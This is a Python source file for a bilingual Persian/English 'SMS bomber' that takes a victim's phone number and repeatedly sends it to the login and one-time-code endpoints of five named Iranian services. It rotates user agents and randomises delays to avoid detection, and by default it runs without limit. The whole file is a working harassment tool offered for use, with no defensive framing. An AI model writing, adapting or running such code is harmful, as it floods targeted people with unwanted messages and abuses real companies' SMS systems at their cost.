import requests
import time
import threading
import random
import json
from datetime import datetime

class ProfessionalSMSBomber:
    def __init__(self):
        self.language = "fa"  # پیش فرض فارسی
        self.services = [
            {
                "name": {"fa": "اسنپ", "en": "Snapp"},
                "url": "https://api.snapp.ir/api/v1/sms/link",
                "data": lambda phone: {"phone": phone},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "name": {"fa": "دیجی‌کالا", "en": "Digikala"},
                "url": "https://api.digikala.com/v1/user/authenticate/",
                "data": lambda phone: {
                    "backUrl": "/",
                    "username": phone,
                    "otp_call": False,
                    "hash": None
                },
                "headers": {"Content-Type": "application/json"}
            },
            {
                "name": {"fa": "دیوار", "en": "Divar"},
                "url": "https://api.divar.ir/v5/auth/authenticate", 
                "data": lambda phone: {"phone": phone},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "name": {"fa": "تپسی", "en": "Tap30"},
                "url": "https://tap33.me/api/v2/user",
                "data": lambda phone: {"credential": phone},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "name": {"fa": "جابینجا", "en": "Jobinja"},
                "url": "https://jobinja.ir/api/v1/user/account/login",
                "data": lambda phone: {"username": phone},
                "headers": {"Content-Type": "application/json"}
            }
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]
        
        self.messages = {
            "fa": {
                "welcome": "💣 SMS Bomber حرفه‌ای",
                "version": "🛠️  نسخه: 2.0 - دو زبانه",
                "phone_prompt": "📞 شماره تلفن هدف: ",
                "delay_prompt": "⏰ تأثیر بین دورها (ثانیه) [پیش‌فرض: 5]: ",
                "max_requests_prompt": "🎯 حداکثر درخواست (0=نامحدود) [پیش‌فرض: 0]: ",
                "language_prompt": "🌐 زبان / Language (fa/en): ",
                "invalid_phone": "❌ شماره تلفن نامعتبر است",
                "invalid_phone_en": "Invalid phone number",
                "starting": "🚀 شروع SMS Bomber",
                "target": "📞 شماره هدف:",
                "target_en": "Target number:",
                "delay": "⏰ تأثیر:",
                "delay_en": "Delay:",
                "max_requests": "🎯 حداکثر درخواست:",
                "max_requests_en": "Max requests:",
                "unlimited": "نامحدود",
                "unlimited_en": "Unlimited",
                "stop_hint": "⏹️  برای توقف Ctrl+C را فشار دهید",
                "stop_hint_en": "⏹️  Press Ctrl+C to stop",
                "round_complete": "📊 دور {} کامل شد - تأثیر {} ثانیه",
                "round_complete_en": "📊 Round {} completed - Delay {} seconds",
                "next_round": "⏳ دور بعدی در {} ثانیه...",
                "next_round_en": "⏳ Next round in {} seconds...",
                "stopped": "🛑 بمباران متوقف شد",
                "stopped_en": "🛑 Bombing stopped",
                "final_stats": "📈 آمار نهایی:",
                "final_stats_en": "📈 Final statistics:",
                "duration": "⏱️  مدت زمان:",
                "duration_en": "Duration:",
                "total_requests": "📨 کل درخواست‌ها:",
                "total_requests_en": "Total requests:",
                "successful": "✅ موفق:",
                "successful_en": "Successful:",
                "failed": "❌ ناموفق:",
                "failed_en": "Failed:",
                "success_rate": "📊 نرخ موفقیت:",
                "success_rate_en": "Success rate:",
                "real_time_stats": "📊 آمار لحظه‌ای: درخواست‌ها: {} | موفق: {:.1f}%",
                "real_time_stats_en": "📊 Live stats: Requests: {} | Success: {:.1f}%",
                "service_success": "✅ {}",
                "service_failed": "❌ {} - کد: {}",
                "service_error": "❌ {} - خطا: {}",
                "service_error_en": "❌ {} - Error: {}"
            },
            "en": {
                "welcome": "💣 Professional SMS Bomber",
                "version": "🛠️  Version: 2.0 - Bilingual",
                "phone_prompt": "📞 Target phone number: ",
                "delay_prompt": "⏰ Delay between rounds (seconds) [Default: 5]: ",
                "max_requests_prompt": "🎯 Maximum requests (0=unlimited) [Default: 0]: ",
                "language_prompt": "🌐 Language / زبان (en/fa): ",
                "invalid_phone": "❌ Invalid phone number",
                "starting": "🚀 Starting SMS Bomber",
                "target": "📞 Target number:",
                "delay": "⏰ Delay:",
                "max_requests": "🎯 Max requests:",
                "unlimited": "Unlimited",
                "stop_hint": "⏹️  Press Ctrl+C to stop",
                "round_complete": "📊 Round {} completed - Delay {} seconds",
                "next_round": "⏳ Next round in {} seconds...",
                "stopped": "🛑 Bombing stopped",
                "final_stats": "📈 Final statistics:",
                "duration": "⏱️  Duration:",
                "total_requests": "📨 Total requests:",
                "successful": "✅ Successful:",
                "failed": "❌ Failed:",
                "success_rate": "📊 Success rate:",
                "real_time_stats": "📊 Live stats: Requests: {} | Success: {:.1f}%",
                "service_success": "✅ {}",
                "service_failed": "❌ {} - Code: {}",
                "service_error": "❌ {} - Error: {}"
            }
        }
        
        self.is_running = False
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "start_time": None
        }

    def t(self, key):
        """ترجمه متن بر اساس زبان انتخاب شده"""
        return self.messages[self.language].get(key, key)

    def validate_phone(self, phone):
        """اعتبارسنجی شماره تلفن - Phone number validation"""
        phone = str(phone).strip().replace(" ", "").replace("-", "")
        return phone if len(phone) == 11 and phone.startswith('09') and phone.isdigit() else None

    def send_sms(self, service, phone):
        """ارسال SMS به یک سرویس - Send SMS to a service"""
        try:
            headers = service["headers"].copy()
            headers["User-Agent"] = random.choice(self.user_agents)
            
            response = requests.post(
                service["url"],
                json=service["data"](phone),
                headers=headers,
                timeout=10
            )
            
            self.stats["total_requests"] += 1
            
            if response.status_code in [200, 201]:
                self.stats["successful_requests"] += 1
                service_name = service["name"][self.language]
                return True, self.t("service_success").format(service_name)
            else:
                self.stats["failed_requests"] += 1
                service_name = service["name"][self.language]
                return False, self.t("service_failed").format(service_name, response.status_code)
                
        except Exception as e:
            self.stats["failed_requests"] += 1
            service_name = service["name"][self.language]
            error_msg = self.t("service_error").format(service_name, str(e))
            return False, error_msg

    def bomber_worker(self, phone, delay, max_requests):
        """کارگر اصلی برای ارسال پیام‌ها - Main worker for sending messages"""
        request_count = 0
        round_number = 0
        
        while self.is_running and (max_requests == 0 or request_count < max_requests):
            round_number += 1
            
            for service in self.services:
                if not self.is_running:
                    break
                    
                success, message = self.send_sms(service, phone)
                current_time = datetime.now().strftime("%H:%M:%S")
                print(f"[{current_time}] {message}")
                
                # تأثیر تصادفی بین درخواست‌ها - Random delay between requests
                time.sleep(random.uniform(0.5, 2))
            
            request_count += len(self.services)
            print(self.t("round_complete").format(round_number, delay))
            
            # تأثیر بین دورها - Delay between rounds
            for i in range(delay, 0, -1):
                if not self.is_running:
                    break
                print(self.t("next_round").format(i), end="\r")
                time.sleep(1)

    def start_bombing(self, phone, delay=5, max_requests=0):
        """شروع بمباران SMS - Start SMS bombing"""
        validated_phone = self.validate_phone(phone)
        if not validated_phone:
            error_msg = self.t("invalid_phone")
            if self.language == "fa":
                error_msg += f" / {self.messages['en']['invalid_phone']}"
            return False, error_msg

        self.is_running = True
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "start_time": datetime.now()
        }

        print(f"\n{self.t('starting')}")
        print(f"{self.t('target')} {validated_phone}")
        if self.language == "fa":
            print(f"{self.t('target_en')} {validated_phone}")
        
        print(f"{self.t('delay')} {delay} {self.t('delay').split(':')[0][1:]}")
        if self.language == "fa":
            print(f"{self.t('delay_en')} {delay} seconds")
        
        max_req_text = self.t("unlimited") if max_requests == 0 else max_requests
        print(f"{self.t('max_requests')} {max_req_text}")
        if self.language == "fa":
            max_req_text_en = self.t("unlimited_en") if max_requests == 0 else max_requests
            print(f"{self.t('max_requests_en')} {max_req_text_en}")
        
        print(self.t("stop_hint"))
        if self.language == "fa":
            print(self.t("stop_hint_en"))
        print("=" * 60)

        # اجرا در ترد جداگانه - Run in separate thread
        thread = threading.Thread(
            target=self.bomber_worker, 
            args=(validated_phone, delay, max_requests)
        )
        thread.daemon = True
        thread.start()

        return True, self.t("starting")

    def stop_bombing(self):
        """توقف بمباران - Stop bombing"""
        self.is_running = False
        print(f"\n{self.t('stopped')}")
        if self.language == "fa":
            print(self.t("stopped_en"))
        
        # نمایش آمار نهایی - Show final statistics
        duration = datetime.now() - self.stats["start_time"]
        print(f"\n{self.t('final_stats')}")
        if self.language == "fa":
            print(self.t("final_stats_en"))
        
        print(f"   {self.t('duration')} {duration}")
        if self.language == "fa":
            print(f"   {self.t('duration_en')} {duration}")
        
        print(f"   {self.t('total_requests')} {self.stats['total_requests']}")
        if self.language == "fa":
            print(f"   {self.t('total_requests_en')} {self.stats['total_requests']}")
        
        print(f"   {self.t('successful')} {self.stats['successful_requests']}")
        if self.language == "fa":
            print(f"   {self.t('successful_en')} {self.stats['successful_requests']}")
        
        print(f"   {self.t('failed')} {self.stats['failed_requests']}")
        if self.language == "fa":
            print(f"   {self.t('failed_en')} {self.stats['failed_requests']}")
        
        success_rate = (self.stats["successful_requests"]/self.stats["total_requests"]*100) if self.stats["total_requests"] > 0 else 0
        print(f"   {self.t('success_rate')} {success_rate:.1f}%")
        if self.language == "fa":
            print(f"   {self.t('success_rate_en')} {success_rate:.1f}%")

    def get_stats(self):
        """دریافت آمار جاری - Get current statistics"""
        if self.stats["start_time"]:
            duration = datetime.now() - self.stats["start_time"]
            success_rate = (self.stats["successful_requests"]/self.stats["total_requests"]*100) if self.stats["total_requests"] > 0 else 0
            return {
                "duration": str(duration),
                "total_requests": self.stats["total_requests"],
                "successful_requests": self.stats["successful_requests"],
                "failed_requests": self.stats["failed_requests"],
                "success_rate": success_rate
            }
        return None

def main():
    """رابط کاربری اصلی - Main user interface"""
    bomber = ProfessionalSMSBomber()
    
    print(f"{bomber.t('welcome')}")
    print(f"{bomber.t('version')}")
    print("=" * 50)
    
    try:
        # انتخاب زبان - Language selection
        lang = input(bomber.t("language_prompt")).strip().lower()
        if lang in ['en', 'english']:
            bomber.language = "en"
        else:
            bomber.language = "fa"

        # دریافت اطلاعات از کاربر - Get user input
        phone = input(bomber.t("phone_prompt"))
        
        try:
            delay_input = input(bomber.t("delay_prompt")) or "5"
            max_requests_input = input(bomber.t("max_requests_prompt")) or "0"
            delay = int(delay_input)
            max_requests = int(max_requests_input)
        except:
            delay = 5
            max_requests = 0
        
        # شروع بمباران - Start bombing
        success, message = bomber.start_bombing(phone, delay, max_requests)
        if not success:
            print(f"❌ {message}")
            return
        
        # منتظر ماندن برای توقف - Wait for stop
        try:
            while bomber.is_running:
                time.sleep(1)
                
                # نمایش آمار هر 10 ثانیه - Show stats every 10 seconds
                stats = bomber.get_stats()
                if stats and stats['total_requests'] > 0 and stats['total_requests'] % 10 == 0:
                    print(bomber.t("real_time_stats").format(
                        stats['total_requests'], 
                        stats['success_rate']
                    ))
                    if bomber.language == "fa":
                        print(bomber.messages["en"]["real_time_stats"].format(
                            stats['total_requests'], 
                            stats['success_rate']
                        ))
                    print("-" * 40)
                        
        except KeyboardInterrupt:
            bomber.stop_bombing()
            
    except Exception as e:
        print(f"❌ خطا / Error: {e}")

if __name__ == "__main__":
    main()
